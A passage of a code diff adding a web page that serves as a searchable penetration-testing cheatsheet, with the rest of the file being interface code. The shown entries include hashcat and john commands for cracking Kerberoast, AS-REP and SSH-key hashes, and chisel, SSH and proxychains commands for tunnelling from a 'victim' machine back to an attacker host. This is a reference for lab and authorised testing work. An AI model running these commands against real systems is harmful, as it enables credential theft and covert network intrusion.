+            tags: ['hashcat', 'cracking', 'kerberoasting'],
+          },
+          {
+            label: 'AS-REP Roast hash (-m 18200)',
+            cmd: 'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -O',
+            tags: ['hashcat', 'cracking', 'asrep'],
+          },
+          {
+            label: 'With rules (better coverage)',
+            cmd: 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O',
+            tags: ['hashcat', 'cracking'],
+          },
+          {
+            label: 'John — auto-detect and crack',
+            cmd: 'john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt && john hashes.txt --show',
+            tags: ['john', 'cracking'],
+          },
+          {
+            label: 'John — SSH private key',
+            cmd: 'ssh2john id_rsa > id_rsa.hash && john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt',
+            tags: ['john', 'cracking', 'ssh'],
+          },
+        ],
+      },
+      {
+        title: 'Tunneling & Pivoting',
+        entries: [
+          {
+            label: 'Chisel — SOCKS5 proxy (attacker server)',
+            cmd: 'chisel server --reverse --port 5000',
+            tags: ['chisel', 'tunneling'],
+          },
+          {
+            label: 'Chisel — SOCKS5 proxy (victim client)',
+            cmd: '.\\chisel.exe client {LHOST}:5000 R:socks',
+            note: 'Creates SOCKS5 proxy on 127.0.0.1:1080. Use with proxychains.',
+            tags: ['chisel', 'tunneling'],
+          },
+          {
+            label: 'Chisel — port forward',
+            cmd: '.\\chisel.exe client {LHOST}:5000 R:{LPORT}:127.0.0.1:{RPORT}',
+            note: 'Expose a specific internal port on your local machine.',
+            tags: ['chisel', 'tunneling'],
+          },
+          {
+            label: 'SSH — dynamic SOCKS proxy',
+            cmd: 'ssh -D 1080 -N {USER}@{TARGET}',
+            note: 'Creates SOCKS5 on port 1080. Use with proxychains.',
+            tags: ['ssh', 'tunneling'],
+          },
+          {
+            label: 'SSH — local port forward',
+            cmd: 'ssh -L {LPORT}:{INTERNAL_HOST}:{RPORT} {USER}@{TARGET} -N',
+            note: 'Access internal service at localhost:{LPORT}.',
+            tags: ['ssh', 'tunneling'],
+          },
+          {
+            label: 'Proxychains — route tools through SOCKS',
+            cmd: 'proxychains4 -q nmap -sT -Pn {INTERNAL_TARGET}',
+            note: 'Edit /etc/proxychains4.conf: add socks5 127.0.0.1 1080 at the bottom.',
+            tags: ['proxychains', 'tunneling'],
+          },
+        ],
+      },
+    ],
+  },
+]
+
+const allEntries = phases.flatMap(p => p.groups.flatMap(g => g.entries))
+const allTags = [...new Set(allEntries.flatMap(e => e.tags))].sort()
+const totalCount = allEntries.length
+
+const colorMap: Record<string, { bg: string; text: string; border: string; badge: string }> = {
+  blue:   { bg: 'bg-blue-400/8',   text: 'text-blue-400',   border: 'border-blue-400/20',   badge: 'bg-blue-400/15 text-blue-400' },
+  violet: { bg: 'bg-violet-400/8', text: 'text-violet-400', border: 'border-violet-400/20', badge: 'bg-violet-400/15 text-violet-400' },
+  amber:  { bg: 'bg-amber-400/8',  text: 'text-amber-400',  border: 'border-amber-400/20',  badge: 'bg-amber-400/15 text-amber-400' },
+  rose:   { bg: 'bg-rose-400/8',   text: 'text-rose-400',   border: 'border-rose-400/20',   badge: 'bg-rose-400/15 text-rose-400' },
+  orange: { bg: 'bg-orange-400/8', text: 'text-orange-400', border: 'border-orange-400/20', badge: 'bg-orange-400/15 text-orange-400' },
+  green:  { bg: 'bg-green-400/8',  text: 'text-green-400',  border: 'border-green-400/20',  badge: 'bg-green-400/15 text-green-400' },
+}
+---
+
+<Layout title="Cheatsheet" description="Penetration testing command reference — organized by phase from recon to post-exploitation">
+
+  {/* ── Header ── */}
+  <div class="mt-4 mb-8">
+    <div class="flex flex-col sm:flex-row sm:items-end gap-4 justify-between">
+      <div>
+        <h1 class="text-3xl font-bold text-heading1 tracking-tight">Pentest Cheatsheet</h1>
+        <p class="mt-1.5 text-foreground/55 text-sm max-w-xl">
+          {totalCount} commands organized by attack phase — from initial recon through post-exploitation.
+          Seeded from real HTB writeups.
+        </p>
+      </div>
+      <div class="flex items-center gap-2 text-xs text-foreground/40 shrink-0">
+        <span class="inline-block size-2 rounded-full bg-green-400 animate-pulse"></span>
+        {totalCount} entries · {phases.length} phases
+      </div>
+    </div>
+
+    {/* Search + filter */}
+    <div class="mt-5 flex flex-col sm:flex-row gap-3">
+      <div class="relative flex-1">
+        <svg class="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-foreground/30 pointer-events-none" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"/>
+        </svg>
+        <input
+          id="cs-search"
+          type="text"
+          placeholder="Search commands, tools, techniques..."
+          autocomplete="off"
+          class="w-full pl-10 pr-4 py-2.5 rounded-xl bg-foreground/4 border-1 border-foreground/10 focus:border-accent/50 focus:outline-none text-sm text-foreground placeholder:text-foreground/30 transition-colors"
+        />
+      </div>
+      <div class="flex items-center gap-2 shrink-0">
+        <button id="cs-pins-btn" class="hidden items-center gap-2 text-sm px-3 py-2.5 rounded-xl border-1 border-foreground/10 text-foreground/50 hover:text-foreground hover:border-foreground/25 transition-all">
+          <svg class="w-4 h-4" viewBox="0 0 20 20" fill="currentColor"><path d="M9.828.722a.5.5 0 01.354 0l4.243 4.243a.5.5 0 010 .707l-.707.707L11.5 4.5l-1.075 1.075 4.95 4.95a.5.5 0 01-.707.707L9.72 6.284 8 8.004l.354.354a.5.5 0 010 .707l-1.06 1.06a.5.5 0 01-.708 0L1.172 4.71a.5.5 0 010-.707L2.232 3a.5.5 0 01.707 0l.354.354L5.5 1.5 2.757 4.243a.5.5 0 01-.707-.707L5.757.722a.5.5 0 01.354 0z"/></svg>
+          Pinned (<span id="cs-pin-count">0</span>)
+        </button>
+      </div>
+    </div>
+
+    {/* Phase nav pills */}
+    <div class="mt-4 flex flex-wrap gap-2">
+      <button data-phase="all" class="cs-phase-btn active-phase text-xs px-3 py-1.5 rounded-full border-1 border-foreground/15 text-foreground/60 hover:text-foreground hover:border-foreground/30 transition-all font-medium">
+        All phases
+      </button>
+      {phases.map(p => {
+        const c = colorMap[p.color]
+        return (
+          <button
+            data-phase={p.id}
+            class={`cs-phase-btn text-xs px-3 py-1.5 rounded-full border-1 transition-all font-medium ${c.border} ${c.text} hover:${c.bg}`}
+          >
+            {p.phase}: {p.title}
+          </button>
+        )
+      })}
+    </div>
+  </div>
+
+  {/* ── Pinned section ── */}
+  <div id="cs-pinned-section" class="hidden mb-8 rounded-xl border-1 border-accent/20 bg-accent/3 overflow-hidden">
+    <div class="px-5 py-3 border-b-1 border-accent/10 flex items-center justify-between">
+      <span class="text-sm font-semibold text-accent">Pinned Commands</span>
+      <button id="cs-clear-pins" class="text-xs text-foreground/40 hover:text-foreground/70 transition-colors">Clear all</button>
+    </div>
+    <div id="cs-pinned-grid" class="p-4 grid grid-cols-1 lg:grid-cols-2 gap-2"></div>
+  </div>
+
+  {/* ── No results ── */}
+  <div id="cs-no-results" class="hidden text-center py-16">
+    <p class="text-foreground/40 text-sm">No commands found for "<span id="cs-search-term"></span>"</p>
+    <p class="text-foreground/25 text-xs mt-1">Try a tool name, technique, or keyword</p>
+  </div>
+
+  {/* ── Phase sections ── */}
+  <div id="cs-content" class="space-y-12">
+    {phases.map(phase => {
+      const c = colorMap[phase.color]
+      return (
+        <section data-phase={phase.id} class="cs-phase-section">
+          {/* Phase header */}
+          <div class={`rounded-xl border-1 p-5 mb-6 ${c.bg} ${c.border}`}>
+            <div class="flex items-start gap-4">
+              <div class={`p-2.5 rounded-lg ${c.bg} ${c.text} border-1 ${c.border} shrink-0`} set:html={phase.icon}></div>
+              <div>
+                <div class={`text-xs font-semibold uppercase tracking-widest mb-0.5 ${c.text}`}>{phase.phase}</div>
+                <h2 class="text-xl font-bold text-heading1">{phase.title}</h2>
+                <p class="text-sm text-foreground/55 mt-1">{phase.description}</p>
+              </div>
+            </div>
+          </div>
+
+          {/* Groups */}
+          <div class="space-y-8">
+            {phase.groups.map(group => (
+              <div class="cs-group">
+                <h3 class="text-sm font-semibold text-foreground/70 mb-3 flex items-center gap-2">
+                  <span class={`inline-block w-1 h-4 rounded-full ${c.text.replace('text-', 'bg-')} opacity-60`}></span>
+                  {group.title}
+                </h3>
+                <div class="space-y-2">
+                  {group.entries.map(entry => (
+                    <div
+                      class="cs-entry group rounded-xl border-1 border-foreground/8 bg-foreground/2 hover:border-foreground/15 hover:bg-foreground/4 transition-all"
+                      data-label={entry.label.toLowerCase()}
+                      data-cmd={entry.cmd.toLowerCase()}
+                      data-tags={(entry.tags || []).join(' ')}
+                      data-phase={phase.id}
+                      data-full-cmd={entry.cmd}
+                      data-full-label={entry.label}
+                    >
+                      <div class="p-4">
+                        {/* Top row: label + action buttons */}
+                        <div class="flex items-start justify-between gap-3 mb-2.5">
+                          <p class="text-sm font-medium text-foreground/85 leading-snug">{entry.label}</p>
+                          <div class="flex items-center gap-1.5 shrink-0 opacity-0 group-hover:opacity-100 transition-opacity">
+                            <button
+                              class="cs-pin-btn flex items-center gap-1 text-xs px-2.5 py-1 rounded-lg border-1 border-foreground/10 text-foreground/40 hover:text-amber-400 hover:border-amber-400/30 transition-all"
+                              title="Pin this command"
+                            >
+                              <svg class="w-3 h-3" viewBox="0 0 20 20" fill="currentColor"><path d="M9.828.722a.5.5 0 01.354 0l4.243 4.243a.5.5 0 010 .707l-.707.707L11.5 4.5l-1.075 1.075 4.95 4.95a.5.5 0 01-.707.707L9.72 6.284 8 8.004l.354.354a.5.5 0 010 .707l-1.06 1.06a.5.5 0 01-.708 0L1.172 4.71a.5.5 0 010-.707L2.232 3a.5.5 0 01.707 0l.354.354L5.5 1.5 2.757 4.243a.5.5 0 01-.707-.707L5.757.722a.5.5 0 01.354 0z"/></svg>
+                              Pin
+                            </button>
+                            <button
+                              class="cs-copy-btn flex items-center gap-1 text-xs px-2.5 py-1 rounded-lg border-1 border-foreground/10 text-foreground/40 hover:text-accent hover:border-accent/30 transition-all"
+                            >
+                              <svg class="w-3 h-3" viewBox="0 0 20 20" fill="currentColor"><path d="M8 2a1 1 0 000 2h2a1 1 0 100-2H8z"/><path d="M3 5a2 2 0 012-2 3 3 0 003 3h2a3 3 0 003-3 2 2 0 012 2v6h-4.586l1.293-1.293a1 1 0 00-1.414-1.414l-3 3a1 1 0 000 1.414l3 3a1 1 0 001.414-1.414L10.414 13H15v3a2 2 0 01-2 2H5a2 2 0 01-2-2V5z"/></svg>
+                              Copy
+                            </button>
+                          </div>
+                        </div>
+
+                        {/* Command */}
+                        <div class="rounded-lg bg-foreground/4 border-1 border-foreground/6 px-3.5 py-2.5 font-mono text-xs text-foreground/80 leading-relaxed overflow-x-auto whitespace-pre-wrap break-all">
+                          {entry.cmd}
+                        </div>
+
+                        {/* Note */}
+                        {entry.note && (
+                          <p class="mt-2 text-xs text-foreground/45 leading-relaxed flex gap-1.5">
+                            <svg class="w-3.5 h-3.5 shrink-0 mt-0.5 text-foreground/30" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a.75.75 0 000 1.5h.253a.25.25 0 01.244.304l-.459 2.066A1.75 1.75 0 0010.747 15H11a.75.75 0 000-1.5h-.253a.25.25 0 01-.244-.304l.459-2.066A1.75 1.75 0 009.253 9H9z" clip-rule="evenodd"/></svg>
+                            {entry.note}
+                          </p>
+                        )}
+
+                        {/* Tags */}
+                        <div class="mt-2.5 flex flex-wrap gap-1">
+                          {(entry.tags || []).map(tag => (
+                            <button
+                              class="cs-tag-filter text-xs px-2 py-0.5 rounded-full bg-foreground/5 text-foreground/35 hover:bg-foreground/10 hover:text-foreground/60 transition-colors"
+                              data-tag={tag}
+                            >
+                              {tag}
+                            </button>
+                          ))}
+                        </div>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            ))}
+          </div>
+        </section>
+      )
+    })}
+  </div>
+
+</Layout>
+
+<style>
+  .active-phase {
+    background: color-mix(in srgb, var(--theme-accent), 10%, transparent);
+    border-color: color-mix(in srgb, var(--theme-accent), 40%, transparent);
+    color: var(--theme-accent);
+  }
+.cs-entry.is-pinned {
+  border-color: color-mix(in srgb, var(--color-amber-400) 35%, transparent);
+  background: color-mix(in srgb, var(--color-amber-400) 5%, transparent);
+}
+</style>
+
+<script>
+  const STORAGE_KEY = 'cheatsheet-pins-v2'
+
+  function initCheatsheet() {
+    const searchEl = document.getElementById('cs-search') as HTMLInputElement | null
+    const entries = document.querySelectorAll<HTMLElement>('.cs-entry')
+    const phaseButtons = document.querySelectorAll<HTMLButtonElement>('.cs-phase-btn')
+    const phaseSections = document.querySelectorAll<HTMLElement>('.cs-phase-section')
+    const groups = document.querySelectorAll<HTMLElement>('.cs-group')
+    const noResults = document.getElementById('cs-no-results')
+    const searchTermEl = document.getElementById('cs-search-term')
+    const pinnedSection = document.getElementById('cs-pinned-section')
+    const pinnedGrid = document.getElementById('cs-pinned-grid')
+    const pinCountEl = document.getElementById('cs-pin-count')
+    const pinsBtn = document.getElementById('cs-pins-btn')
+    const clearPinsBtn = document.getElementById('cs-clear-pins')
+    if (!searchEl) return
+
+    let activePhase = 'all'
+    let searchQ = ''
+    let pins: string[] = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]')
+    let activeTagFilter = ''
+
+    // ── filter ────────────────────────────────────────────────────────────
+    function applyFilter() {
+      let visible = 0
+      entries.forEach(el => {
+        const phaseMatch = activePhase === 'all' || el.dataset.phase === activePhase
+        const tagMatch = !activeTagFilter || (el.dataset.tags || '').includes(activeTagFilter)
+        const searchMatch = !searchQ
+          || (el.dataset.label || '').includes(searchQ)
+          || (el.dataset.cmd || '').includes(searchQ)
+          || (el.dataset.tags || '').includes(searchQ)
+        const show = phaseMatch && tagMatch && searchMatch
+        el.style.display = show ? '' : 'none'
+        if (show) visible++
+      })
+
+      // hide empty groups
+      groups.forEach(g => {
+        const any = Array.from(g.querySelectorAll<HTMLElement>('.cs-entry')).some(e => e.style.display !== 'none')
+        g.style.display = any ? '' : 'none'
+      })
+
+      // hide empty phase sections
+      phaseSections.forEach(s => {
+        const any = Array.from(s.querySelectorAll<HTMLElement>('.cs-entry')).some(e => e.style.display !== 'none')
+        s.style.display = any ? '' : 'none'
+      })
+
+      if (noResults) noResults.classList.toggle('hidden', visible > 0)
+      if (searchTermEl) searchTermEl.textContent = searchQ
+    }
+
+    // ── phase tabs ────────────────────────────────────────────────────────
+    phaseButtons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        activePhase = btn.dataset.phase || 'all'
+        activeTagFilter = ''
+        phaseButtons.forEach(b => b.classList.remove('active-phase'))
+        btn.classList.add('active-phase')
+        applyFilter()
+      })
+    })
+
+    // ── search ────────────────────────────────────────────────────────────
+    searchEl.addEventListener('input', () => {
+      searchQ = searchEl.value.toLowerCase().trim()
+      activeTagFilter = ''
+      applyFilter()
+    })
+
+    // ── tag filter pills on entries ───────────────────────────────────────
+    document.addEventListener('click', (e) => {
+      const tagBtn = (e.target as HTMLElement)?.closest<HTMLButtonElement>('.cs-tag-filter')
+      if (!tagBtn) return
+      const tag = tagBtn.dataset.tag || ''
+      if (activeTagFilter === tag) {
+        activeTagFilter = ''
+        searchEl.value = ''
+      } else {
+        activeTagFilter = tag
+        searchEl.value = tag
+        searchQ = ''
+      }
+      applyFilter()
+    })
+
+    // ── copy ──────────────────────────────────────────────────────────────
+    function copyCmd(btn: HTMLElement, cmd: string) {
+      navigator.clipboard.writeText(cmd).then(() => {
+        const prev = btn.innerHTML
+        btn.innerHTML = `<svg class="w-3 h-3" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M16.704 4.153a.75.75 0 01.143 1.052l-8 10.5a.75.75 0 01-1.127.075l-4.5-4.5a.75.75 0 011.06-1.06l3.894 3.893 7.48-9.817a.75.75 0 011.05-.143z" clip-rule="evenodd"/></svg> Copied`
+        btn.style.color = 'var(--theme-accent)'
+        btn.style.borderColor = 'color-mix(in srgb, var(--theme-accent), 40%, transparent)'
+        setTimeout(() => { btn.innerHTML = prev; btn.style.color = ''; btn.style.borderColor = '' }, 1800)
+      })
+    }
+
+    // ── pins ──────────────────────────────────────────────────────────────
+    function savePins() { localStorage.setItem(STORAGE_KEY, JSON.stringify(pins)) }
+
+    function renderPins() {
+      if (!pinnedGrid || !pinnedSection || !pinCountEl || !pinsBtn) return
+      pinCountEl.textContent = String(pins.length)
+      if (pins.length === 0) {
+        pinnedSection.classList.add('hidden')
+        pinsBtn.classList.add('hidden')
+        pinsBtn.classList.remove('flex')
+        return
+      }
+      pinsBtn.classList.remove('hidden')
+      pinsBtn.classList.add('flex')
+      pinnedGrid.innerHTML = ''
+      pins.forEach(label => {
+        const entry = Array.from(entries).find(e => e.dataset.fullLabel === label)
+        if (!entry) return
+        const cmd = entry.dataset.fullCmd || ''
+        const div = document.createElement('div')
+        div.className = 'flex items-start gap-3 p-3 rounded-lg border-1 border-foreground/8 bg-foreground/3 group'
+        div.innerHTML = `
+          <div class="flex-1 min-w-0">
+            <p class="text-xs font-medium text-foreground/70 mb-1.5">${label}</p>
+            <code class="text-xs font-mono text-foreground/60 break-all">${cmd}</code>
+          </div>
+          <div class="flex flex-col gap-1 shrink-0">
+            <button class="pin-copy flex items-center gap-1 text-xs px-2 py-1 rounded border-1 border-foreground/10 text-foreground/40 hover:text-accent transition-all">Copy</button>
+            <button class="pin-remove flex items-center gap-1 text-xs px-2 py-1 rounded border-1 border-foreground/10 text-foreground/40 hover:text-red-400 transition-all">✕</button>
+          </div>
+        `
+        div.querySelector('.pin-copy')?.addEventListener('click', (e) => copyCmd(e.currentTarget as HTMLElement, cmd))
+        div.querySelector('.pin-remove')?.addEventListener('click', () => {
+          pins = pins.filter(p => p !== label)
+          savePins()
+          renderPins()
+          Array.from(entries).find(e => e.dataset.fullLabel === label)?.classList.remove('is-pinned')
+        })
+        pinnedGrid.appendChild(div)
+      })
+    }
+
+    clearPinsBtn?.addEventListener('click', () => {
+      pins = []
+      savePins()
+      entries.forEach(e => e.classList.remove('is-pinned'))
+      renderPins()
+    })
+
+    pinsBtn?.addEventListener('click', () => pinnedSection?.classList.toggle('hidden'))
+
+    // wire per-entry pin + copy buttons
+    entries.forEach(entry => {
+      const label = entry.dataset.fullLabel || ''
+      const cmd = entry.dataset.fullCmd || ''
+      if (pins.includes(label)) entry.classList.add('is-pinned')
+      entry.querySelector('.cs-copy-btn')?.addEventListener('click', e => copyCmd(e.currentTarget as HTMLElement, cmd))
+      entry.querySelector('.cs-pin-btn')?.addEventListener('click', () => {
+        if (pins.includes(label)) {
+          pins = pins.filter(p => p !== label)
+          entry.classList.remove('is-pinned')
+        } else {
+          pins = [label, ...pins]
+          entry.classList.add('is-pinned')
+        }
+        savePins()
+        renderPins()
+      })
+    })
+
+    renderPins()
+    applyFilter()
+  }
+
+  initCheatsheet()
+  document.addEventListener('astro:after-swap', initCheatsheet)
+</script>
